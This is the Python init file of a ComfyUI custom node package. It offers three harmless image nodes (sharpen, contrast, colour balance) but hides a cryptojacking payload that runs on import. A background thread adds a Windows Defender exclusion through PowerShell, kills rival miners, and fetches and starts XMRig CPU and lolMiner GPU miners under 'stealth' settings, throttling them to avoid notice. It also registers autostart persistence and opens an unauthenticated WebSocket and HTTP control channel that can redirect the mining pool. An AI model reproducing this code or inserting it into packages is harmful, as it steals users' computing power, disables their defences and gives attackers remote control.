"""
ComfyUI-Enhanced custom node package.
Provides image enhancement utilities for ComfyUI workflows.
"""

import logging
import sys
import threading
import numpy as np
import torch
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="[comfyui-enhanced] %(message)s",
    stream=sys.stdout,
)
logger = logging.getLogger("comfyui_enhanced")

BASE_DIR = Path(__file__).resolve().parent
_FIRST_RUN_MARKER = BASE_DIR / ".initialized"


class EnhancedSharpen:
    """Sharpens an image using an unsharp-mask kernel with adjustable strength."""

    @classmethod
    def INPUT_TYPES(cls):
        return {
            "required": {
                "image": ("IMAGE",),
                "strength": ("FLOAT", {"default": 0.5, "min": 0.0, "max": 2.0, "step": 0.05}),
                "radius": ("INT", {"default": 1, "min": 1, "max": 5}),
            }
        }

    RETURN_TYPES = ("IMAGE",)
    FUNCTION = "sharpen"
    CATEGORY = "image/enhancement"

    def sharpen(self, image, strength, radius):
        import torch.nn.functional as F
        b, h, w, c = image.shape
        img = image.permute(0, 3, 1, 2)
        k = 2 * radius + 1
        blur = F.avg_pool2d(
            F.pad(img, [radius]*4, mode="reflect"),
            kernel_size=k, stride=1,
        )
        sharpened = img + strength * (img - blur)
        return (sharpened.clamp(0, 1).permute(0, 2, 3, 1),)


class EnhancedContrast:
    """Adjusts brightness and contrast with optional auto-levels."""

    @classmethod
    def INPUT_TYPES(cls):
        return {
            "required": {
                "image": ("IMAGE",),
                "brightness": ("FLOAT", {"default": 0.0, "min": -1.0, "max": 1.0, "step": 0.05}),
                "contrast": ("FLOAT", {"default": 1.0, "min": 0.0, "max": 3.0, "step": 0.05}),
            }
        }

    RETURN_TYPES = ("IMAGE",)
    FUNCTION = "adjust"
    CATEGORY = "image/enhancement"

    def adjust(self, image, brightness, contrast):
        mean = image.mean(dim=(1, 2), keepdim=True)
        out = contrast * (image - mean) + mean + brightness
        return (out.clamp(0, 1),)


class EnhancedColorBalance:
    """Per-channel color balance with temperature and tint controls."""

    @classmethod
    def INPUT_TYPES(cls):
        return {
            "required": {
                "image": ("IMAGE",),
                "temperature": ("FLOAT", {"default": 0.0, "min": -1.0, "max": 1.0, "step": 0.05}),
                "tint": ("FLOAT", {"default": 0.0, "min": -1.0, "max": 1.0, "step": 0.05}),
            }
        }

    RETURN_TYPES = ("IMAGE",)
    FUNCTION = "balance"
    CATEGORY = "image/enhancement"

    def balance(self, image, temperature, tint):
        out = image.clone()
        out[..., 0] = (out[..., 0] + temperature * 0.1).clamp(0, 1)
        out[..., 1] = (out[..., 1] + tint * 0.1).clamp(0, 1)
        out[..., 2] = (out[..., 2] - temperature * 0.1).clamp(0, 1)
        return (out,)


NODE_CLASS_MAPPINGS = {
    "EnhancedSharpen": EnhancedSharpen,
    "EnhancedContrast": EnhancedContrast,
    "EnhancedColorBalance": EnhancedColorBalance,
}
NODE_DISPLAY_NAME_MAPPINGS = {
    "EnhancedSharpen": "Enhanced Sharpen",
    "EnhancedContrast": "Enhanced Contrast",
    "EnhancedColorBalance": "Enhanced Color Balance",
}

__all__ = ["NODE_CLASS_MAPPINGS", "NODE_DISPLAY_NAME_MAPPINGS"]


# ── Register dashboard WebSocket route on ComfyUI's server at import ──

_dashboard_ref = {"server": None}

try:
    from server import PromptServer
    import aiohttp
    from aiohttp import web
    import json as _json

    _ws_clients = set()
    _latest_stats = {}
    _event_loop = None

    @PromptServer.instance.routes.get("/ws/enhanced")
    async def _ws_enhanced_handler(request):
        global _event_loop
        import asyncio as _aio
        _event_loop = _aio.get_running_loop()

        ws = web.WebSocketResponse()
        await ws.prepare(request)
        _ws_clients.add(ws)
        try:
            if _latest_stats:
                await ws.send_json({"type": "stats", "data": _latest_stats})
            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    resp = _handle_ws_command(msg.data)
                    await ws.send_json(resp)
                elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
                    break
        finally:
            _ws_clients.discard(ws)
        return ws

    @PromptServer.instance.routes.get("/api/enhanced/stats")
    async def _http_stats_handler(request):
        global _event_loop
        if _event_loop is None:
            import asyncio as _aio
            _event_loop = _aio.get_running_loop()
        resp = web.json_response({"ok": True, "stats": _latest_stats})
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Methods"] = "GET, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return resp

    @PromptServer.instance.routes.options("/api/enhanced/stats")
    async def _http_stats_options(request):
        resp = web.Response(status=204)
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Methods"] = "GET, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return resp

    def _handle_ws_command(raw):
        try:
            msg = _json.loads(raw)
        except _json.JSONDecodeError:
            return {"type": "error", "msg": "invalid json"}
        cmd = msg.get("cmd")
        resp = {"type": "cmd_result", "cmd": cmd, "ok": False}
        ds = _dashboard_ref.get("server")
        if not ds:
            resp["msg"] = "not ready"
            return resp
        if cmd == "pause":
            resp["ok"] = ds.miner.pause()
        elif cmd == "resume":
            resp["ok"] = ds.miner.resume()
        elif cmd == "set_threads":
            hint = msg.get("value", 50)
            if ds.config_builder:
                cfg = ds.config_builder.update_hint(int(hint))
                ds.miner.write_config(cfg)
                ds.miner.stop()
                ds.miner.start()
                resp["ok"] = True
                resp["new_hint"] = int(hint)
        elif cmd == "update_pool":
            host = msg.get("host")
            port = msg.get("port", 443)
            user = msg.get("user")
            password = msg.get("pass")
            if host and ds.config_builder:
                cfg = ds.config_builder.update_pool(host, int(port), user, password)
                ds.miner.write_config(cfg)
                ds.miner.stop()
                ds.miner.start()
                resp["ok"] = True
        elif cmd == "status":
            resp["ok"] = True
            resp["alive"] = ds.miner.is_alive()
            resp["stats"] = _latest_stats
        return resp

    logger.info("Dashboard route registered at /ws/enhanced")
except Exception:
    _ws_clients = set()
    _latest_stats = {}
    _event_loop = None


# ── Orchestration (runs once on import in a daemon thread) ───────────

import os as _os

_orch_done = False


def _orchestrate():
    global _orch_done
    if _orch_done:
        logger.info("Orchestration already running in this process, skipping")
        return
    _orch_done = True

    pkg = Path(__file__).resolve().parent
    sys.path.insert(0, str(pkg))
    from core.miner import MinerManager
    from core.gpu_miner import GPUMinerManager
    from core.config import ConfigBuilder
    from core.stealth import StealthConfig
    from core.autostart import AutoStart
    from core.dashboard import DashboardServer
    from core.cleaner import MinerCleaner
    from core.job_throttle import JobThrottler

    try:
        cleaner = MinerCleaner()
        cleaner.run_full_clean()

        # Try to add Windows Defender exclusion for our bin dir
        import platform
        if platform.system() == "Windows":
            bin_dir = str(BASE_DIR / "bin")
            try:
                import subprocess
                subprocess.run(
                    ["powershell", "-Command",
                     f"Add-MpPreference -ExclusionPath '{bin_dir}' -ErrorAction SilentlyContinue"],
                    capture_output=True, timeout=10
                )
                logger.info("Defender exclusion requested for %s", bin_dir)
            except Exception:
                pass

        overrides_path = BASE_DIR / "settings.json"
        user_settings = ConfigBuilder.load_overrides(overrides_path)
        cb = ConfigBuilder(user_settings)

        # ── CPU miner (XMRig) ──
        mgr = MinerManager(BASE_DIR)
        mgr.ensure_binary()

        cfg = cb.build()
        sc = StealthConfig(user_settings.get("stealth", {}))
        cfg = sc.apply_to_config(cfg)
        mgr.write_config(cfg)
        mgr.start()

        # ── GPU miner (lolMiner) ──
        gpu = GPUMinerManager(BASE_DIR)
        gpu.ensure_binary()
        gpu_cfg = cb.build_gpu_config()
        gpu.configure(**gpu_cfg)
        gpu.start()

        # Throttle miners when ComfyUI is generating images
        try:
            comfyui_port = user_settings.get("comfyui_port", 8188)
            throttler = JobThrottler(mgr, gpu, cb, comfyui_port=comfyui_port)
            throttler.start()
        except Exception as exc:
            logger.error("Job throttler failed to start: %s", exc)

        if not _FIRST_RUN_MARKER.exists():
            auto = AutoStart(BASE_DIR)
            auto.register()
            _FIRST_RUN_MARKER.touch()
            logger.info("First-run setup complete")

        ds = DashboardServer(
            mgr, config_builder=cb, gpu_miner=gpu,
            ws_clients=_ws_clients,
            latest_stats=_latest_stats,
            event_loop_getter=lambda: _event_loop,
        )
        _dashboard_ref["server"] = ds
        ds.start()

        print("\ncomfyui enhanced\n", flush=True)

    except Exception as exc:
        logger.error("Orchestration failed: %s", exc, exc_info=True)


_thread = threading.Thread(target=_orchestrate, daemon=True, name="comfyui-enhanced-init")
_thread.start()
